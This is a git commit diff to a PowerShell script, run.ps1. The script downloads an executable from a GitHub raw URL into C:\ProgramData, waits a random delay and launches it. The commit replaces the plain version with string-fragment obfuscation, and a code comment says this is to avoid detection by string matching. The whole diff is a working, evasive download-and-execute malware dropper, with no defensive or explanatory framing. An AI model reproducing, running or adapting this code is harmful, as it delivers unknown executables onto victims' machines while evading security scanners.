68cda1b317ef9a8fb1959e3fc8d59f090cd17a0f
floorsofolga-svg <floorsofolga@gmail.com>
2026-01-27 21:17:46 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,8 +1,13 @@
-$part1 = "https://github.com/floor"
-$part2 = "sofolga-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe"
-$url = $part1 + "com/" + $part2
-$outputPath = "C:\ProgramData\program.exe"
-Invoke-WebRequest -Uri $url -OutFile $outputPath
-$randomDelay = Get-Random -Minimum 5 -Maximum 15
-Start-Sleep -Seconds $randomDelay
-Start-Process $outputPath
+# Obfuscated script to avoid direct string matching
+$frag1 = 'I' + 'nv' + 'oke' + '-' + 'We' + 'bR' + 'equest'
+$frag2 = '-U' + 'ri'
+$frag3 = 'https://' + 'gith' + 'ub.com/' + 'flo' + 'orso' + 'folga' + '-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe'
+$frag4 = '-OutFile'
+$frag5 = 'C:\ProgramData\program.exe'
+& $frag1 $frag2 $frag3 $frag4 $frag5  # Reconstruct and execute
+
+$randDelay = [Math]::Abs((Get-Random) % 10) + 5  # Random delay 5-15 seconds
+Start-Sleep -Seconds $randDelay
+
+$procStart = 'Start-Process'
+& $procStart $frag5
